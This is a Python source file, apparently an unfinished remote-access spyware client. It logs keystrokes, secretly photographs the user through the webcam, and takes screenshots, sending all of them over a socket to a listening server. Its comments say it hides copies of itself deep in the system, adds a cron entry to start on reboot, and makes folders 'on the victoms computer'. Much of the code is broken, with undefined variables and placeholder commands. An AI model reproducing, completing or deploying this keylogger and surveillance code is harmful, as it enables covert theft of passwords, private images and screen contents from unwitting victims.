import os
import threading
import socket
import cv2
import platform
import sys
import threading
import pyautogui
import time
import keyboard
import getpass
from crontab import CronTab

def log_keys(self):
    try:
        
        os.chdir('C:\\Drivers\\network\\keylogs')
        x = 1
        while True:
            if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
                x += 1
            else:
                filename = "logged_text" + str(x) + ".txt"
                
                #generate the text file for logging keys
                with open(filename, 'w+') as file:
                    #while the number of characters is less than 300
                    for x in range(300):
                        file.write(keyboard.read_key())
                        file.write('\n')
                    
                #the start of the sending, file was created above and is giogn to be sent below

                #file sending code
                if os.path.isfile(filename):
                    #send filename
                    face_screenshot_socket.send(filename.encode())
                    
                    #sending filename
                    face_screenshot_socket.sendall(str(filename).encode())

                    #sending filesize
                    face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
                    
                    with open(filename, 'rb') as f:
                        packetAmmount = ceil(filesize/2048)
                        for x in range(0, packetAmmount):
                            bytesToSend = f.read(2048)
                            face_screenshot_socket.send(bytesToSend)
                        print("file sent!")
                else:
                    face_screenshot_socket.sendall('false'.encode())
                    print("file does not exist...")
    except:

        pass

#occasional screenshots of the person behind the camera of the computer
def camera_screenshot(self):
    #not finished yet
    try:
        #change directory to face screenshots folder
        os.chdir('C:\\Drivers\\network\\face-screenshots')
        
        #enter the ipaddress of the listening server
        host = '192.168.1.254' 
        face_screenshot_port = 27654

        face_screenshot_socket = socket.socket()
        face_screenshot_socket.connect(host, face_screenshot_port)

        x = 1
        while True:
            time.sleep(5)
            if (str('image' + str(x)) in str(os.listdir()) + '\\face-screenshots'):
                x += 1
            else:
                camera = cv2.VideoCapture(0)
                return_value, image = camera.read()
                if return_value:
                    filename = 'image' + str(x) + '.png'
                    cv2.imwrite(filename, image)

                    #the start of the sending, file was created above and is giogn to be sent below

                    #file sending code
                    if os.path.isfile(filename):
                        #send filename
                        face_screenshot_socket.send(filename.encode())
                        
                        #sending filename
                        face_screenshot_socket.sendall(str(filename).encode())

                        #sending filesize
                        face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
                        
                        with open(filename, 'rb') as f:
                            packetAmmount = ceil(filesize/2048)
                            for x in range(0, packetAmmount):
                                bytesToSend = f.read(2048)
                                face_screenshot_socket.send(bytesToSend)
                            print("file sent!")
                    else:
                        face_screenshot_socket.sendall('false'.encode())
                        print("file does not exist...")
    except:
        pass

#screenshots of the screen every .5 seconds
def computer_screenshot(self):
    #not finished yet
    os.chdir('C:\\Drivers\\network\\computer-screenshots')
    try:
        x = 1
        while True:
            time.sleep(5)
            if ('screenshot' + str(x) in os.listdir() + '\\computer-screenshots'):
                x += 1
            else:
                filename = 'screenshot' + str(x) + '.png'
                screenshot = pyautogui.screenshot()
                screenshot.save(filename)

                #the start of the sending, file was created above and is giogn to be sent below

                #file sending code
                if os.path.isfile(filename):
                    #send filename
                    face_screenshot_socket.send(filename.encode())
                    
                    #sending filename
                    face_screenshot_socket.sendall(str(filename).encode())

                    #sending filesize
                    face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
                    
                    with open(filename, 'rb') as f:
                        packetAmmount = ceil(filesize/2048)
                        for x in range(0, packetAmmount):
                            bytesToSend = f.read(2048)
                            face_screenshot_socket.send(bytesToSend)
                        print("file sent!")
                else:
                    face_screenshot_socket.sendall('false'.encode())
                    print("file does not exist...")
                
    except:
        pass


try:
    if platform.system == 'Linux':
        #saving a copy of the program in a deep location in the computer
        os.system('touch /opt/client.py')
        os.system('echo (insert entire script here) > /opt/client.py')

        #adding a link to the file that is saved deep in the computer to 
        #the crontab for on reboot
        new_cron = CronTab(user=getpass.getuser())
        job = new_cron.new(command='python ')

    elif platform.system == 'Windows':
        #i am going to start out with doing windows.
        
        #saving a copy of the program in a deep location in the computer
        os.system('type nul > C:\Drivers\network\client.py')
        os.system('type (insert entire script here) > C:\Drivers\network\client.py')

        #change the directory to the network drive
        os.chdir(r'C:\Drivers\network')

        #creating all of the necessary folders for the files to be saved in on the victoms computer
        os.mkdir("computer-screenshots")
        os.mkdir("face-screenshots")
        os.mkdir("keylogs")

        #initialize the listener object
        spy = listener()

        #starting each process in the listener class on a different thread
        computer_screenshot_thread = threading.Thread(target=computer_screenshot)
        camera_screenshot_thread = threading.Thread(target=camera_screenshot)
        log_keys_thread = threading.Thread(target=log_keys)

        computer_screenshot_thread.start()
        camera_screenshot_thread.start()
        log_keys_thread.start()
except:
    #in the except all of the information will be sent from the folders before doinng the sys.exit
    
    
    sys.exit(1)